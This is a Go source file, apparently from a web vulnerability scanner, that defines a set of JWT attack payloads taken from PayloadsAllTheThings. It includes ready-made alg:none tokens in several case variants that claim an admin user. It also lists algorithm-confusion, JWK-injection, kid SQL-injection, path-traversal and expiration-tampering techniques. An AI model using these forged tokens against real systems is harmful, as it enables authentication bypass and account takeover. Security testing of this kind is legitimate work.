package payloads

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// JWT Vulnerabilities â€” Sourced from PayloadsAllTheThings/JSON Web Token
// Covers: Algorithm None, RS256â†’HS256 Confusion, JWK Injection, KID Injection,
//         Expiration Tampering, Signature Stripping
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

func JWTPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatJWT,
		Description: "JWT Vulnerabilities â€” PayloadsAllTheThings + CWE-347",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token",
		Payloads:    jwtAll(),
	}
}

func jwtAll() []Payload {
	return []Payload{
		// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Algorithm None â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		{
			ID: "jwt-alg-none", Category: CatJWT,
			Technique: TechAlgNone,
			Name: "JWT alg:none", Value: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6ImFkbWluIiwiaWF0IjoxNjYxNzg5NjAwfQ.`,
			Contexts:  []InjectionContext{CtxHTTPHeader, CtxCookie, CtxURLQuery},
			Detection: DetectContentDiff,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			CWE: "CWE-347", OWASPCategory: "A02:2021",
			Description: "JWT with alg:none and empty signature â€” bypasses signature verification",
			Reference: "PayloadsAllTheThings", Tags: []string{"alg_none"}, Enabled: true,
		},
		{
			ID: "jwt-alg-none-capitalized", Category: CatJWT,
			Technique: TechAlgNone,
			Name: "JWT alg:None (capitalized)", Value: `eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6ImFkbWluIiwiaWF0IjoxNjYxNzg5NjAwfQ.`,
			Contexts:  []InjectionContext{CtxHTTPHeader, CtxCookie},
			Detection: DetectContentDiff,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			CWE: "CWE-347", OWASPCategory: "A02:2021",
			Description: "JWT with alg:None (capital N) â€” bypasses case-sensitive none check",
			Reference: "PayloadsAllTheThings", Tags: []string{"alg_none", "case_bypass"}, Enabled: true,
		},
		{
			ID: "jwt-alg-none-nOnE", Category: CatJWT,
			Technique: TechAlgNone,
			Name: "JWT alg:nOnE (mixed)", Value: `eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6ImFkbWluIiwiaWF0IjoxNjYxNzg5NjAwfQ.`,
			Contexts:  []InjectionContext{CtxHTTPHeader, CtxCookie},
			Detection: DetectContentDiff,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			CWE: "CWE-347", OWASPCategory: "A02:2021",
			Description: "JWT with alg:nOnE (mixed case) â€” PayloadsAllTheThings variant",
			Reference: "PayloadsAllTheThings", Tags: []string{"alg_none", "case_bypass"}, Enabled: true,
		},

		// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Algorithm Confusion RS256â†’HS256 â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		{
			ID: "jwt-alg-confusion-hs256", Category: CatJWT,
			Technique: TechAlgConfusion,
			Name: "RS256â†’HS256 Confusion", Value: `alg_confusion_hs256`,
			Contexts:  []InjectionContext{CtxHTTPHeader, CtxCookie},
			Detection: DetectContentDiff,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			CWE: "CWE-347", OWASPCategory: "A02:2021",
			Description: "Algorithm confusion attack â€” RS256 public key used as HS256 secret",
			Reference: "PayloadsAllTheThings", Tags: []string{"alg_confusion"}, Enabled: true,
		},

		// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ JWK Header Injection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		{
			ID: "jwt-jwk-injection", Category: CatJWT,
			Technique: TechJWKInjection,
			Name: "JWK Header Injection", Value: `jwk_header_injection`,
			Contexts:  []InjectionContext{CtxHTTPHeader, CtxCookie},
			Detection: DetectContentDiff,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			CWE: "CWE-347", OWASPCategory: "A02:2021",
			Description: "Embed attacker-controlled JWK in JWT header â€” self-signed token accepted",
			Reference: "PayloadsAllTheThings", Tags: []string{"jwk_injection"}, Enabled: true,
		},

		// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ KID Injection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		{
			ID: "jwt-kid-sqli", Category: CatJWT,
			Technique: TechKIDInjection,
			Name: "KID SQL Injection", Value: `kid_sqli`,
			Contexts:  []InjectionContext{CtxHTTPHeader, CtxCookie},
			Detection: DetectErrorPattern, DetectSignature: `(?i)(sql.syntax|unterminated|error)`,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			CWE: "CWE-89", OWASPCategory: "A03:2021",
			Description: "SQL injection via JWT kid header â€” fetches key from DB",
			Reference: "PayloadsAllTheThings", Tags: []string{"kid", "sqli"}, Enabled: true,
		},
		{
			ID: "jwt-kid-path-traversal", Category: CatJWT,
			Technique: TechKIDInjection,
			Name: "KID Path Traversal", Value: `kid_path_traversal`,
			Contexts:  []InjectionContext{CtxHTTPHeader, CtxCookie},
			Detection: DetectContentDiff,
			Severity: SevCritical, SafeMode: true, CVSSScore: 9.8,
			CWE: "CWE-22", OWASPCategory: "A01:2021",
			Description: "KID set to ../../../../dev/null â€” sign with empty key to forge tokens",
			Reference: "PayloadsAllTheThings", Tags: []string{"kid", "path_traversal"}, Enabled: true,
		},

		// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Expiration Tampering â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
		{
			ID: "jwt-exp-far-future", Category: CatJWT,
			Technique: TechExpTampering,
			Name: "Expiration Far Future", Value: `exp_far_future`,
			Contexts:  []InjectionContext{CtxHTTPHeader, CtxCookie},
			Detection: DetectContentDiff,
			Severity: SevMedium, SafeMode: true, CVSSScore: 5.4,
			CWE: "CWE-613", OWASPCategory: "A07:2021",
			Description: "JWT exp set to year 2099 â€” tests if expiration is enforced",
			Reference: "PayloadsAllTheThings", Tags: []string{"expiration"}, Enabled: true,
		},
		{
			ID: "jwt-exp-removed", Category: CatJWT,
			Technique: TechExpTampering,
			Name: "Expiration Claim Removed", Value: `exp_removed`,
			Contexts:  []InjectionContext{CtxHTTPHeader, CtxCookie},
			Detection: DetectContentDiff,
			Severity: SevMedium, SafeMode: true, CVSSScore: 5.4,
			CWE: "CWE-613", OWASPCategory: "A07:2021",
			Description: "JWT with exp claim removed â€” tests if server requires expiration",
			Reference: "PayloadsAllTheThings", Tags: []string{"expiration"}, Enabled: true,
		},
	}
}
